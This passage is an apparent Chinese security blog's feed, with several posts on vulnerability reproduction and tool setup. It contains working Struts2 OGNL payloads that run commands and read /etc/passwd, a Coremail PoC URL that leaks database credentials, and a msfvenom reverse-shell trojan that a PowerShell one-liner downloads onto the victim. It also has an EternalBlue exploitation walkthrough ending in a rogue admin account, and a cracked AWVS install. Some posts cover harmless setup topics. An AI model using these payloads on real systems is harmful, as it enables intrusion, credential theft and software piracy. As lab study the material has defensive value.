src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My1jZWI3ZjBiOTEzMGYyNGNlLnBuZw" alt="image"></p><p>这个漏洞的问题在于可以直接输入和直接回显<br>将POC粘到一个输入框，点击Submit<br>此后会将数据提交到后端，后端检测值是否为空，然后返回，满足漏洞前提</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>获取tomcat执行路径：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="string">"tomcatBinDir&#123;"</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty</span>(<span class="string">"user.dir"</span>)+<span class="string">"&#125;"</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0wOGRiYjU2OTg3NTk5N2ZkLnBuZw" alt="在这里插入图片描述"><br>获取Web路径：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0xN2EyMDBlODNlOWQzOWIx" alt="在这里插入图片描述"><br>执行任意命令（命令参数：<code>pwd</code>）：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;"pwd"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xODMzMjE1My0xOTJhZTdiZTM5NTQwODc1" alt="在这里插入图片描述"></p><p>命令要自己构造如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;cat&quot;,&quot;&#x2F;etc&#x2F;passwd&quot;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Coremail-0day敏感文件泄露漏洞送附批量检测脚本</title>
      <link href="/2019/06/17/Coremail-0day%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E9%80%81%E9%99%84%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/"/>
      <url>/2019/06/17/Coremail-0day%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E9%80%81%E9%99%84%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a><strong>漏洞介绍</strong></h2><p>Coremail邮件系统是业内唯一一款商用的超大规模运营级邮件系统，开始研发于1999年 [1] ，其前身为中国第一套中文电子邮件系统163\126，目前在中国的客户包括网易系列邮箱、中国移动手机邮箱(139)等国内领先的邮箱服务运营商，以及宝钢、首钢、南方电网、农业银行、交通银行、华润、神华、华能等世界500强中国企业，截止2019年，Coremail邮件系统产品在国内已拥有10亿终端用户 [2] ，已成为中国用户实际使用最广泛的电子邮件系统。</p><p>2019年5月22日，国家信息安全漏洞共享平台（CNVD）收录了由北京天融信网络安全技术有限公司报送的Coremail邮件系统信息泄露漏洞（CNVD-2019-16798）。<br>由于Coremail邮件系统的mailsms模块的参数大小写敏感存在缺陷，使得攻击者利用该漏洞，在未授权的情况下，通过远程访问URL地址获知Coremail服务器的系统配置文件，造成数据库连接参数等系统敏感配置信息泄露。</p><p>**<br>泄露页：<br><img src="https://img-blog.csdnimg.cn/20190617223418397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;mailsms&#x2F;s?func&#x3D;ADMIN:appState&amp;dumpConfig&#x3D;&#x2F;</span><br></pre></td></tr></table></figure><p>**<br>利用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域名&#x2F;IP等地址+POC</span><br></pre></td></tr></table></figure><p>即可获取目标邮件服务器配置文件<br>配置文件包括：文件路径、IP、端口、数据库用户、密码等敏感信息。</p><p>**<br><img src="https://img-blog.csdnimg.cn/2019061722321129.png" alt="在这里插入图片描述"><br>使用方法如下<br><img src="https://img-blog.csdnimg.cn/20190617223222864.png" alt="在这里插入图片描述"><br><strong>影响范围</strong><br>Coremail XT 3.0.1至XT 5.0.9版本，XT 5.0.9a及以上版本已修复该漏洞。</p><h2 id="批量测试脚本"><a href="#批量测试脚本" class="headerlink" title="批量测试脚本"></a><strong>批量测试脚本</strong></h2><p>自己写的简单脚本，大神勿喷，有意见我尽量改<br>**</p><h2 id="请勿用于非法扫描！"><a href="#请勿用于非法扫描！" class="headerlink" title="请勿用于非法扫描！"></a>请勿用于非法扫描！</h2><p>**<br>链接：<a href="https://pan.baidu.com/s/12N_2uJ4w7z_M3d-RZ8tN8Q" target="_blank" rel="noopener">https://pan.baidu.com/s/12N_2uJ4w7z_M3d-RZ8tN8Q</a><br>提取码：n0xx</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 0day coremail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android反编译(apktool、dex2jar、jd-gui）三件套教程</title>
      <link href="/2019/06/14/Android%E5%8F%8D%E7%BC%96%E8%AF%91(apktool%E3%80%81dex2jar%E3%80%81jd-gui%EF%BC%89%E4%B8%89%E4%BB%B6%E5%A5%97%E6%95%99%E7%A8%8B/"/>
      <url>/2019/06/14/Android%E5%8F%8D%E7%BC%96%E8%AF%91(apktool%E3%80%81dex2jar%E3%80%81jd-gui%EF%BC%89%E4%B8%89%E4%BB%B6%E5%A5%97%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="Android反编译-apktool、dex2jar、jd-gui）三件套教程"><a href="#Android反编译-apktool、dex2jar、jd-gui）三件套教程" class="headerlink" title="Android反编译(apktool、dex2jar、jd-gui）三件套教程"></a>Android反编译(apktool、dex2jar、jd-gui）三件套教程</h1><p>这个是网上流行的使用工具，我现在重新写一下屡一下思路</p><p><strong>apk反编译软件有个组合套餐：apktool 、dex2jar、jd-jui，</strong></p><p>我直接打包好了一套工具，也配置好了，使用可以直接用剩的再收集麻烦w<br>这个下载地址：<br><a href="https://download.csdn.net/download/god_zzz/11241989" target="_blank" rel="noopener">https://download.csdn.net/download/god_zzz/11241989</a></p><h2 id="简单介绍一下，大概了解一下各自是干什么的："><a href="#简单介绍一下，大概了解一下各自是干什么的：" class="headerlink" title="简单介绍一下，大概了解一下各自是干什么的："></a>简单介绍一下，大概了解一下各自是干什么的：</h2><p><strong>## apktool</strong></p><p>可以反编译软件的布局文件、xml文件、AndroidManifest.xml和图片等。</p><p><strong>## dex2jar</strong></p><p>将apk反编译成java源码，也就是说把classes.dex转化成jar文件，反编译源码</p><p><strong>## jd-gui</strong><br>源码文件转化成jar文件，这个打开直接查看jar的源码</p><p>**</p><h2 id="开始反编译"><a href="#开始反编译" class="headerlink" title="开始反编译"></a>开始反编译</h2><ul><li>第一步下载好工具和要测试的apk</li><li>然后使用</li><li></li></ul><h2 id="apktool使用注意"><a href="#apktool使用注意" class="headerlink" title="apktool使用注意"></a>apktool使用注意</h2><ul><li>要确保他们三个在一个文件夹里面，然后打开CMD命令把路径切到这里<br><img src="https://img-blog.csdnimg.cn/20190614213145709.png" alt="在这里插入图片描述"></li></ul><p>使用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d -f  ***.apk</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190614213908118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019061421401366.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190614214040881.png" alt="在这里插入图片描述"><br>里面就是所要的文件，第一部分结束</p><h2 id="第二部分–dex2jar反编译源文件"><a href="#第二部分–dex2jar反编译源文件" class="headerlink" title="第二部分–dex2jar反编译源文件"></a>第二部分–dex2jar反编译源文件</h2><ul><li></li><li>找到APK文件，直接右键解压</li><li>解压到新的文件夹，记得解压重新命名要不会覆盖（因为名字一样）</li><li>找到里面的文件 classes.dex</li><li><strong>classes.dex</strong>是我们要的文件</li><li></li><li><img src="https://img-blog.csdnimg.cn/20190614214529909.png" alt="在这里插入图片描述"></li><li></li><li><strong>第二步把classes.dex文件放到dex2jar解压好的文件夹里</strong></li><li></li></ul><p><img src="https://img-blog.csdnimg.cn/2019061421481150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>##还是要注意 运行命令的实话路径一定要切换到当前路径</p><p>然后输入命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2j-dex2jar.bat classes.dex</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190614215124837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样反编译就成功了</p><p>**</p><h2 id="最后一步用JD-GUI查看源码"><a href="#最后一步用JD-GUI查看源码" class="headerlink" title="最后一步用JD-GUI查看源码"></a>最后一步用JD-GUI查看源码</h2><p>**<br>**</p><ul><li>现在有了jar文件</li><li>直接双击打开JD-GUI</li><li>把jar文件直接拖进去就可以看了<br><img src="https://img-blog.csdnimg.cn/20190614215634222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>**</li></ul><p><strong>##这就是反编译的过程了</strong><br><strong>有一个提醒就行，用命令行有个问题如果生成的文件已经有了就会报错，不会提示你覆盖，所以运行之前最好检查不要有已经存在可能重名的</strong></p>]]></content>
      
      
      <categories>
          
          <category> app渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android 反编译 app渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux版awvs最新版v_190325161的安装记录</title>
      <link href="/2019/06/13/Linux%E7%89%88awvs%E6%9C%80%E6%96%B0%E7%89%88v_190325161%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/06/13/Linux%E7%89%88awvs%E6%9C%80%E6%96%B0%E7%89%88v_190325161%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>因为之前52的安装教程贴被删除了<br>所以我自己重新记录一下<br>方便以后的使用<br>也是自己用的环境 -—我用的是2019的ubantu和Xshell</p><p>下载地址<a href="https://download.csdn.net/download/god\_zzz/11238215" target="_blank" rel="noopener">https://download.csdn.net/download/god\_zzz/11238215</a><br>里面有三个：： 一个安装包一个破解文件一个安装说明</p><p>**</p><h2 id="下面开始安装"><a href="#下面开始安装" class="headerlink" title="下面开始安装"></a>下面开始安装</h2><p>**</p><ul><li>安装环境依赖（如果有问题先更新一下源）</li></ul><p><code>root@kali:~# sudo apt-get install libxdamage1 libgtk-3-0 libasound2 libnss3 libxss1 \-y</code></p><blockquote><p>正在读取软件包列表… 完成 正在分析软件包的依赖关系树 正在读取状态信息… 完成 libxss1<br>已经是最新版 (1:1.2.3-1)。 libxss1 已设置为手动安装。 将会同时安装下列软件： libasound2-data<br>libgtk-3-common libxdamage-dev 建议安装： alsa-utils 下列软件包将被升级：<br>libasound2 libasound2-data libgtk-3-0 libgtk-3-common libnss3<br>libxdamage-dev libxdamage1 升级了 7 个软件包，新安装了 0 个软件包，要卸载 0 个软件包，有 1115<br>个软件包未被升级。 … … …</p><p>正在处理用于 libc-bin (2.28-2) 的触发器 …</p></blockquote><p><strong>第二部传文件</strong></p><ul><li><strong>传文件</strong></li></ul><p>r<br>root@kali:/home# ls</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;home# rz                           我用的Xshell直接传</span><br><span class="line"></span><br><span class="line">root@kali:&#x2F;home# ls</span><br></pre></td></tr></table></figure><p>acunetix_trial.sh AWVS12-Linux.zip Linux_Awvs安装说明.txt patch_awvs</p><ul><li></li></ul><p><strong>&gt; 改文件的操作权限@@@@@@@@@</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;home# chmod u+x *</span><br><span class="line"></span><br><span class="line">root@kali:&#x2F;home# ls</span><br></pre></td></tr></table></figure><p>acunetix_trial.sh AWVS12-Linux.zip Linux_Awvs安装说明.txt patch_awvs（全绿可执行）</p><p><strong>- 安装开始</strong></p><ul><li><p>中间输入用户名密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;home# .&#x2F;acunetix_trial.sh</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>交互式输入用户信息:</p><ol><li>是否同意协议:yes</li><li>输入主机名:</li><li>输入管理员邮箱:xxx@xxx.com 就是用户名</li><li>输入密码:!Q2w3e4r</li></ol></blockquote><ul><li>安装结束后访问:<br><a href="https://ip:13443/" target="_blank" rel="noopener">https://ip:13443/</a> 当然kali你的IP地址<br><img src="https://img-blog.csdnimg.cn/20190612172401116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>安装pojie文件</li><li></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">##拷贝 patch_awvs 到后面得安装目录</span><br><span class="line">root@Nessus: cp patch_awvs &#x2F;home&#x2F;acunetix&#x2F;.acunetix_trial&#x2F;v_190325161&#x2F;scanner&#x2F;       </span><br><span class="line"></span><br><span class="line">## 找到安装目录里面去</span><br><span class="line">root@Nessus:cd &#x2F;home&#x2F;acunetix&#x2F;.acunetix_trial&#x2F;v_190325161&#x2F;scanner</span><br><span class="line"></span><br><span class="line">## 必须在里面运行</span><br><span class="line">root@Nessus:&#x2F;home&#x2F;acunetix&#x2F;.acunetix_trial&#x2F;v_190325161&#x2F;scanner# .&#x2F;patch_awvs</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190612185624234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>安装成功</p><p>检查是否成功:<br>登录系统后, 点击右上角的”Administrator-&gt;Profile-&gt;License”,可以看到99999就说明成功激活</p><p>修改不检查更新:<br>登录系统后,左下角Settings-&gt;ProductUpgrades,改为”Do not automaticaly check for update[Not Recommanded]“</p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWVS 破解 Linux 无限 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF木马的简单利用</title>
      <link href="/2019/06/06/MSF%E6%9C%A8%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/"/>
      <url>/2019/06/06/MSF%E6%9C%A8%E9%A9%AC%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>刚刚试了下永恒之蓝，看到有人用木马，也补一下后面的其他<br>环境和那一片的一样</p><ol><li>msfvenom模块，首先生成.exe木马文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.77.0.109 lport&#x3D;4443f exe &gt;&#x2F;root&#x2F;1.exe</span><br></pre></td></tr></table></figure><p>1.exe 就是木马 要把这个用各种方法去受害机运行</p><p><img src="https://img-blog.csdnimg.cn/2019060616093520.png" alt="在这里插入图片描述"><br>2. 输入msfconsole进入metasploi<br>3. 进入监听模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br></pre></td></tr></table></figure><ol start="4"><li>设置payload反弹</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure><ol start="5"><li>设置监听ip端口</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set lhost 10.77.0.109</span><br><span class="line">set lport 4443</span><br><span class="line">要与木马一致</span><br></pre></td></tr></table></figure><ol start="6"><li>运行<img src="https://img-blog.csdnimg.cn/20190606161629689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>kali这边就准备完了，等待上线</li></ol><h2 id="在目标主机运行-1-exe-木马"><a href="#在目标主机运行-1-exe-木马" class="headerlink" title="在目标主机运行 1.exe 木马"></a>在目标主机运行 1.exe 木马</h2><p>利用是之前的ms17010直接shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile( &#39;http:&#x2F;&#x2F;10.77.0.100&#x2F;1.exe&#39;,&#39;c:\1.exe&#39;)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190606164405347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上线成功</p><p>后续的。。再写</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>试试MSF的ms17-010永恒之蓝漏洞利用</title>
      <link href="/2019/06/06/%E8%AF%95%E8%AF%95MSF%E7%9A%84ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
      <url>/2019/06/06/%E8%AF%95%E8%AF%95MSF%E7%9A%84ms17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="试验环境"><a href="#试验环境" class="headerlink" title="试验环境"></a>试验环境</h2><p>(内网地址)</p><ul><li>-win7（未打补丁开445） 10.77.0.128</li><li>kali 10.77.0.109</li></ul><h2 id="首先信息收集，探测"><a href="#首先信息收集，探测" class="headerlink" title="首先信息收集，探测"></a>首先信息收集，探测</h2><ul><li>nmap意思一下</li></ul><blockquote><p><code>- nmap \-sS \-P0 \-A \-v 10.77.0.100</code></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190606120817590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="开的445"></p><h2 id="扫描漏洞"><a href="#扫描漏洞" class="headerlink" title="扫描漏洞"></a>扫描漏洞</h2><ul><li>msfconsole 启动</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><ul><li>加载扫描exp</li></ul><blockquote><p><code>use auxiliary/scanner/smb/smb_ms17_010</code></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190606135637929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>设置目标ip</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 10.77.0.128</span><br></pre></td></tr></table></figure><ul><li>运行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190606140644531.png" alt="在这里插入图片描述">发现可以利用</p><hr><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>加载攻击模块</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br></pre></td></tr></table></figure><ul><li>设置参数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 10.77.0.128</span><br></pre></td></tr></table></figure><ul><li>运行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190606142202832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>运行成功 进去了</p><p>可以直接CMD命令<br><img src="https://img-blog.csdnimg.cn/20190606142721340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><p>权限很高<br>直接net user</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user 123 1234 &#x2F;add（用户名 密码）</span><br><span class="line">net localgroup administrators xxxx &#x2F;add （将用户设置为管理员权限）</span><br></pre></td></tr></table></figure><p>重新打开一个终端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop+IP</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190606144604550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 永恒之蓝 MSF ms17-010 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmtools坑</title>
      <link href="/2019/06/04/vmtools%E5%9D%91/"/>
      <url>/2019/06/04/vmtools%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p><strong>ubantu</strong></p><hr><p>但是…第一步：sudo apt-get autoremove open-vm-tools就告诉我，我没安装open-vm-tools</p><p>所以…就直接把open-vm-tools装上吧…</p><p><code>sudo apt-get install open-vm-tools-desktop</code></p><hr><hr><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><p>原来Kali2.0的官网早就有说明，官方自己开发了一个vmtools工具，好崩溃~~~~</p><p><code>apt-get install open-vm-tools-desktop fuse</code></p><hr>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Centos7 安装uwsgi失败</title>
      <link href="/2019/05/13/Centos7%20%E5%AE%89%E8%A3%85uwsgi%E5%A4%B1%E8%B4%A5/"/>
      <url>/2019/05/13/Centos7%20%E5%AE%89%E8%A3%85uwsgi%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>centos7 安装uwsgi失败</p><h2 id="失败过程"><a href="#失败过程" class="headerlink" title="失败过程"></a>失败过程</h2><p>我是Centos 直接安装没有其他操作</p><p>按照网上部署部署uwsgi+nginx+django 教程</p><p>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</p><p>安装Python包管理<br>easy_install 包 <a href="https://pypi.python.org/pypi/distribute" target="_blank" rel="noopener">https://pypi.python.org/pypi/distribute</a></p><p>安装步骤:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; cd ~ wget</span><br><span class="line">&gt; https:&#x2F;&#x2F;pypi.python.org&#x2F;packages&#x2F;source&#x2F;d&#x2F;distribute&#x2F;distribute-0.6.49.tar.gz</span><br><span class="line">&gt; tar xf distribute-0.6.49.tar.gz cd distribute-0.6.49 python2.7</span><br><span class="line">&gt; setup.py install easy_install --version pip 包:</span><br><span class="line">&gt; https:&#x2F;&#x2F;pypi.python.org&#x2F;pypi&#x2F;pip</span><br></pre></td></tr></table></figure><p>发现没有自带没有安装 pip yum了pip<br>之后<br>使用pip安装<br>pip install uwsgi<br>报错一直没有解决<br>错误代码<br>ERROR: Command “/usr/bin/python2 -u -c ‘import setuptools, tokenize;<strong>file</strong>=’”’”’/tmp/pip-install-WeDbCr/uwsgi/setup.py’”’”’;f=getattr(tokenize, ‘“’”‘open’”’”’, open)(<strong>file</strong>);code=f.read().replace(’”’”’\r\n’”’”’, ‘“’”’\n’”’”’);f.close();exec(compile(code, <strong>file</strong>, ‘“’”‘exec’”’”’))’ install --record /tmp/pip-record-ySrxMo/install-record.txt --single-version-externally-managed --compile” failed with error code 1 in /tmp/pip-install-WeDbCr/uwsgi/</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ol><li>使用python3 安装uwsgi</li><li>在centos自带的Python2下 必须同时安装“编译工具”和“python-devel”</li></ol><p>第二种方法代码<br>三步<br>1安装编译工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y gcc* pcre-devel openssl-devel</span><br></pre></td></tr></table></figure><p>正确截图<img 